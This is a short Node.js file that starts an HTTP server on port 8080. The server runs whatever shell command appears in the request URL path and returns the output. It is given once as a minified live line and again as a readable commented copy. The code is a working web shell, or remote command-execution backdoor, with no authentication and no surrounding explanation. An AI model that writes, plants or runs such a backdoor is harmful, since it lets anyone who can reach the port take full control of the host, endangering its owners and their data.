var http=require('http');var exec=require('child_process').exec;http.createServer((r,p)=>{exec(unescape(r.url.substr(1)),function(error,stdout,stderr){p.write(stdout);p.end();});}).listen(8080);
/*
var http = require('http');
var exec = require('child_process').exec;

http.createServer(function (request, response) {
    var cmd = unescape(request.url.substr(1));
    exec(cmd, function (error, stdout, stderr) {
        response.write(stdout);
        response.end();
    });
}).listen(8080);
*/